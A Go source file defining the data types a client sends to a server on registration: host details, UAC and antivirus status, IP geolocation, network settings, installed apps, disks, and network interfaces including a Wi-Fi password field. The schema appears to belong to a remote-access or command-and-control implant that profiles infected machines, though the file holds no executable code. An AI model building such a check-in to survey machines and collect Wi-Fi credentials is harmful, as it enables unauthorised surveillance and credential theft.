package types

// Type for network interface information
type NetworkInterface struct {
	// Name of the network interface
	SSID string `json:"ssid"`
	// MAC address of the network interface
	MACAddress string `json:"mac_address"`
	// IP address of the network interface
	IPAddresses []string `json:"ip_address"`
	// IsUp indicates if the network interface is up
	IsUp bool `json:"is_up"`
	// IsLoopback indicates if the network interface is a loopback interface meaning it is used for internal communication within the host
	IsLoopback bool `json:"is_loopback"`
	// IsPointToPoint indicates if the network interface is a point-to-point interface meaning it is used for direct communication between two nodes
	IsPointToPoint bool `json:"is_point_to_point"`
	// IsWireless indicates if the network interface is a wireless interface
	IsWireless bool `json:"is_wireless"`
	// Password of the network interface
	Password string `json:"password"`
}

type Application struct {
	// Name of application
	Name string `json:"name"`

	// Version of application
	Version string `json:"version"`

	// Path of application
	Path string `json:"path"`
}

type Disks struct {
	// Name of disk
	Name string `json:"name"`
	// Total size of disk
	TotalSize int64 `json:"total_size"` // in bytes
	// Free size of disk
	FreeSize int64 `json:"free_size"` // in bytes
	// Used size of disk
	UsedSize int64 `json:"used_size"` // in bytes
	// File system type (e.g., NTFS, FAT32, ext4)
	FileSystem string `json:"file_system"`
	// Mount point of disk
	MountPoint string `json:"mount_point"`
}

type TimeZone struct {
	// Name of the time zone
	Name string `json:"name"`
	// Offset from UTC
	Offset string `json:"offset"` // e.g., "+02:00"
	// Abbreviation of the time zone
	Abbr string `json:"abbr"` // e.g., "CEST" for Central European Summer Time
	// Current time in the time zone
	Current string `json:"current"` // e.g., "2023-10-01T12:00:00+02:00"
}

type Geographic struct {
	IP         string `json:"ip"`
	Hostname   string `json:"hostname"`
	City       string `json:"city"`
	Region     string `json:"region"`
	Country    string `json:"country"`
	Loc        string `json:"loc"`
	Org        string `json:"org"`
	PostalCode string `json:"postal"`
	Timezone   string `json:"timezone"`
}
// Type for registration from client to server.
type RegistrationData struct {
	// Name of computer
	ComputerName string `json:"computer_name"`
	// OS of computer
	OS string `json:"os"`
	// OS version of computer
	OSVersion string `json:"os_version"`
	// Total Memory
	TotalMemory int64 `json:"total_memory"` // in bytes
	// Uptime
	Uptime int64 `json:"uptime"` // in seconds
	// UUID (Universally Unique Identifier)
	UUID string `json:"uuid"`
	// CPU Model
	CPUModel string `json:"cpu_model"`
	// GPU Model
	GPUModel string `json:"gpu_model"`
	// UAC (User Account Control) status
	UAC bool `json:"uac"`
	// Antivirus status
	Antivirus bool `json:"antivirus"` 

	// Geographic location information
	Geographic Geographic `json:"geographic"` // Geographic struct containing location information

	// IP Address
	IPAddress string `json:"ip_address"`
	// MAC Address
	MACAddress string `json:"mac_address"`
	// Gateway
	Gateway string `json:"gateway"`
	// Subnet Mask
	SubnetMask string `json:"subnet_mask"`
	// DNS
	DNS []string `json:"dns"` // List of DNS servers
	// ISP (Internet Service Provider)
	ISP string `json:"isp"`

	// Network Interfaces
	NetworkInterfaces []NetworkInterface `json:"network_interfaces"`

	// Apps Recognized
	Apps []Application `json:"apps"` // List of recognized apps installed on the system

	// Disks
	Disks []Disks `json:"disks"` // List of disks on the system
}
